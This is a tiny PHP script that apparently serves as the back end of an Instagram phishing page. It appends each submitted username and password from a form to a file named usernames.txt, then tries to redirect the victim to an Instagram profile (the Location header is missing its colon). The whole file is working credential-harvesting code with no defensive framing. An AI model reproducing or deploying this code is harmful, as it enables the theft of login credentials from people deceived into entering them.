<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location https://instagram.com/yrr.tera.desi.kalakar?igshid=asph6fpsd27v');
exit();
